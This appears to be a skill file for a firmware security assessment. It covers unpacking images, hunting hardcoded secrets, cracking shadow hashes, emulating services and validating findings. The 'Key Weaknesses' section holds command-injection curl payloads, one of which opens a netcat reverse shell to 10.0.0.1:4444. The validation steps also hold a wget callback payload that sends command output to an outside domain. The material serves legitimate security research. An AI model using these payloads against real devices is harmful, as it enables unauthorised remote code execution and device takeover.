---
name: firmware
description: Firmware image analysis — extract the filesystem, hunt secrets, services, and backdoors, then emulate to validate exploitable findings.
---

# Firmware

A firmware image is the packed software stack of an embedded device (router, IoT, camera, ICS controller, BMC). The asset is usually a single binary blob — a vendor `.bin`/`.img`/`.fwu`/`.hdr` update file or a flash dump. The objective is to unpack it down to a root filesystem, recover hardcoded secrets and crypto material, enumerate every service and start-up script that runs on boot, and identify undocumented access (backdoor accounts, debug shells, magic packets) and vulnerable native binaries. Findings here translate directly into device compromise, fleet-wide credential reuse, and supply-chain risk.

## Attack Surface

- **The image itself**: header/magic, compression (gzip/lzma/xz/squashfs/cramfs/jffs2/ubifs), partition layout, padding, appended signatures.
- **Root filesystem**: `/etc` configs, `/etc/passwd` + `/etc/shadow`, init scripts (`/etc/init.d`, `/etc/rc.local`, `S*` scripts), `/etc/inittab`, busybox applet set.
- **Network services**: web UI (lighttpd/uhttpd/boa/goahead/mini_httpd + CGI), telnetd/dropbear/ssh, UPnP/miniupnpd, SNMP, TR-069/CWMP client, DNS/dnsmasq, custom daemons listening on TCP/UDP.
- **Secrets at rest**: TLS private keys, SSH host keys, API tokens, cloud (AWS/Azure) creds, WPA PSKs, default admin passwords, signing/update keys, hardcoded crypto keys/IVs.
- **Update mechanism**: signature verification (or lack thereof), update URL, encryption key embedded in the binary.
- **Native binaries**: CGI handlers, daemons, SUID files — memory-corruption and command-injection sinks.
- **Bootloader/U-Boot env**, NVRAM defaults, and any second-stage payloads or appended encrypted blobs.

## Recon & Enumeration

Install the embedded-analysis toolchain (Kali):
```
apt-get install -y binwalk firmware-mod-kit squashfs-tools cramfsswap mtd-utils \
    sasquatch jefferson ubi_reader fakeroot qemu-user-static u-boot-tools \
    pipx && pipx install uefi_firmware && pip3 install firmware-analysis-toolkit
```
`binwalk` is the workhorse; pull EMBA/FACT or `firmwalker` for higher-level passes when scope allows.

```
# 1. Identify the container before trusting any extension
file fw.bin; binwalk fw.bin                # signature/entropy map of embedded files
binwalk -E fw.bin                          # entropy graph: flat ~8.0 == encrypted/compressed
hexdump -C fw.bin | head                   # inspect header/magic manually

# 2. Recursively carve and extract the filesystem
binwalk -eM fw.bin                         # recursive extract -> _fw.bin.extracted/
                                           # use sasquatch fallback for vendor-mangled squashfs
unsquashfs -d rootfs <offset>.squashfs     # manual squashfs unpack
jefferson jffs2.img -d jffs2_out           # JFFS2; ubireader_extract_files for UBIFS

# 3. Map the unpacked tree
ROOT=$(find _fw.bin.extracted -name 'bin' -type d | head -1 | xargs dirname)
ls -la "$ROOT"; cat "$ROOT/etc/os-release" "$ROOT/etc/openwrt_release" 2>/dev/null

# 4. Hunt secrets across the whole tree
trufflehog filesystem "$ROOT" --json --no-update > secrets.json
gitleaks detect --no-git --source "$ROOT" -f json -r gitleaks.json
grep -rInE 'password|passwd|secret|api[_-]?key|token|BEGIN (RSA|EC|OPENSSH|PRIVATE)' "$ROOT"
find "$ROOT" -name '*.pem' -o -name '*.key' -o -name 'shadow' -o -name '*.p12'

# 5. SBOM / known-CVE component inventory
syft dir:"$ROOT" -o cyclonedx-json=sbom.json   # or: trivy rootfs "$ROOT"
grype sbom:sbom.json                            # CVEs for busybox/openssl/dropbear/dnsmasq versions
trivy rootfs --scanners vuln,secret "$ROOT"

# 6. Static analysis of scripts and native binaries
semgrep --config p/bash --config p/c "$ROOT" --json -o semgrep.json
for b in $(find "$ROOT" -type f -exec file {} + | grep -i 'ELF' | cut -d: -f1); do
  echo "== $b"; file "$b"; strings -n8 "$b" | grep -iE 'system\(|popen|/bin/sh|GET /|secret'
done

# 7. Once emulated and a service is live, treat it like any web/network target
nmap -sV -p- 127.0.0.1; httpx -u http://127.0.0.1:80 -title -tech-detect
nuclei -u http://127.0.0.1:80 -as -s critical,high -silent -j -o nuclei.jsonl
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://127.0.0.1/FUZZ
```

## Methodology

1. **Fingerprint the blob.** `file`, `binwalk`, and an entropy scan. Flat ~8.0 entropy = encrypted or already-compressed; carving will fail. Note vendor magic, header strings, and version markers.
2. **Defeat packaging.** If encrypted, find the decryptor: search prior plaintext firmware versions, the bootloader, or the update binary for the AES key/IV (`strings`, `binwalk -y aes`). Many vendors ship one unencrypted early release — diff it.
3. **Carve and mount.** Recursively extract; use `sasquatch`/`jefferson`/`ubi_reader` when stock tools choke on patched filesystems. Confirm you reached a real root (`/bin`, `/etc`, `/sbin` present).
4. **Inventory the OS.** Identify base (OpenWrt/Buildroot/vendor SDK), kernel version, libc, busybox version and applet list. Build an SBOM for CVE mapping.
5. **Crack credentials.** Pull `/etc/passwd` + `/etc/shadow`; `unshadow` then `john`/`hashcat`. Find plaintext defaults in web configs and NVRAM defaults.
6. **Harvest secrets.** TruffleHog + gitleaks + targeted grep for keys, tokens, cloud creds, TLS/SSH private keys, signing keys, hardcoded crypto.
7. **Map boot and services.** Read `inittab`, `rc*`, `init.d`, and any `/etc/config`; list every daemon that auto-starts and the ports/sockets it binds.
8. **Audit native code.** Disassemble CGIs and daemons (Ghidra/`r2`/`objdump`) for command-injection (`system`/`popen` on tainted input), unauthenticated handlers, and memory-corruption sinks.
9. **Emulate.** `firmadyne`/FAT (`fat.py`) or per-binary `qemu-<arch>-static` chroot. Bring the web stack up locally and exercise it.
10. **Validate** each candidate against the running service with a concrete PoC; record exact request/payload and observed effect.

## Key Weaknesses / Techniques

- **Backdoor / static accounts.** Non-disabled root in `/etc/passwd`, identical `$1$`/`$6$` hash across the fleet, or undocumented users.
  ```
  unshadow "$ROOT/etc/passwd" "$ROOT/etc/shadow" > unshadow.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt; john --show unshadow.txt
  hashcat -m 1800 hashes.txt rockyou.txt   # sha512crypt
  ```
- **Hardcoded crypto / shared TLS keys.** A private key in firmware means every device shares it — passive decryption and impersonation. Confirm reuse by fingerprinting the public half.
  ```
  find "$ROOT" -name '*.key' -o -name '*.pem' | while read k; do openssl rsa -in "$k" -noout -modulus 2>/dev/null | md5sum; done
  ```
- **Command injection in CGI/daemons.** Web params reaching `system()`/`popen()`/backticks. Grep the binary, then confirm on the emulated service.
  ```
  curl 'http://127.0.0.1/cgi-bin/ping.cgi' --data 'host=127.0.0.1;id'   # observe id output
  curl 'http://127.0.0.1/api/diag' --data 'addr=$(busybox nc 10.0.0.1 4444 -e /bin/sh)'
  ```
- **Unauthenticated / magic-packet access.** Hidden endpoints, debug query params (`?debug=1`), or a UDP/TCP listener that drops a root shell on a trigger string (search daemons for raw socket reads compared against constants).
- **Insecure update channel.** No signature verification or signature checked client-side only — craft a malicious image accepted by the device. Look for the verify routine; absence of `RSA_verify`/`ED25519`/cert pinning is the tell.
- **Known-CVE components.** Old dropbear/openssl/dnsmasq/busybox/zlib. Map exact versions from the SBOM to `grype`/`searchsploit`.
- **World-writable / SUID surfaces.** `find "$ROOT" -perm -4000 -o -perm -0002 -type f` — SUID busybox or writable scripts in the boot path are privesc.
- **Debug interfaces left enabled.** `telnetd`/`utelnetd` started in init, dropbear with default keys, serial getty on UART.

## Validation

1. Reproduce in emulation, not just statically — `fat.py fw.bin` or chroot QEMU, then hit the live service so a PoC is observable (`nmap -sV 127.0.0.1` shows the bound port, `curl` returns injected output).
2. For credentials: actually crack the hash and log in (`ssh`/web auth) or show the plaintext default authenticates against the running service.
3. For shared keys: prove the key matches a deployed device's served certificate (modulus/SPKI fingerprint match), not just that a key file exists.
4. For command injection: capture command output in the response (`id`, `uname -a`) or a callback — `interactsh-client -v`, then payload `;wget http://<oast-domain>/$(id|tr ' ' _)` and confirm the inbound hit.
5. For update bypass: build a modified image, repack with the original packer, and show the device/loader accepts it.
6. Save the exact offset, file path, binary, and request that triggers the issue so it is independently reproducible.

## False Positives

- Strings that look like keys but are test fixtures, public certs, CA bundles (`/etc/ssl/certs`), or example configs never loaded at runtime.
- Disabled accounts: shadow entry is `*`/`!`/`!!` or login shell is `/bin/false`/`/sbin/nologin` — no actual access.
- "Secrets" that are unique per-device, generated at first boot by an init script (grep the scripts for the writer) rather than baked in.
- A service binary present but never started — confirm it appears in `inittab`/`rc`/`init.d` before reporting it as live.
- CVEs against a component the device backported a fix for, or against a code path not compiled in (check `strings`/build flags).
- Command-injection sinks fed only by trusted/internal values, not attacker-reachable input — trace the data flow to a network parameter.
- Decompression "files" that are binwalk false carves (zero-length, garbage). Re-extract and verify the filesystem mounts.

## Chaining & Impact

- Hardcoded admin/default cred → web UI auth → CGI command injection → root shell on every unit in the field.
- TLS/SSH private key in firmware → passive traffic decryption + device impersonation → MITM of the management plane across the fleet.
- Update-signature bypass → push a malicious image → persistent, undetectable implant and supply-chain compromise.
- Cloud/API token in the image → pivot to the vendor backend or device-management cloud → fleet-wide control.
- Recovered VPN/WPA/PPPoE secrets → access the operator network behind the device.
- Memory-corruption in an unauthenticated daemon → pre-auth RCE → worming across reachable devices.

## Pro Tips

1. Run `binwalk -E` first. If entropy is flat-high the image is encrypted — stop carving and go find the key (prior firmware version, bootloader, or update tool almost always leaks it).
2. Diff firmware versions. Two releases reveal the encryption key, what was patched, and where backdoors were added or removed (`diffoscope`, or extract both and `diff -r`).
3. When stock `binwalk`/`unsquashfs` fail, vendors used a patched squashfs — switch to `sasquatch`; for NAND dumps strip OOB/ECC before extracting.
4. Always check NVRAM defaults and `default.cfg`/`reset.cfg`, not just `/etc` — factory creds and hidden flags live there.
5. Emulation is worth the effort: many command-injection and auth-bypass bugs are only confirmable against the running CGI stack (`fat.py` / firmadyne handles networking and nvram shims).
6. Grep daemons for raw `recvfrom`/`read` compared against string constants — that pattern is a classic magic-packet backdoor.
7. Map exact library versions to CVEs via SBOM before manual reversing; busybox/dropbear/openssl versions alone often yield critical known bugs.
8. Check the update verify path explicitly — "signed firmware" is often verified only in the app/cloud, not on-device, leaving the loader fully bypassable.
9. Keep extraction outputs and offsets; embedded analysis is iterative and you will re-carve as you learn the layout.
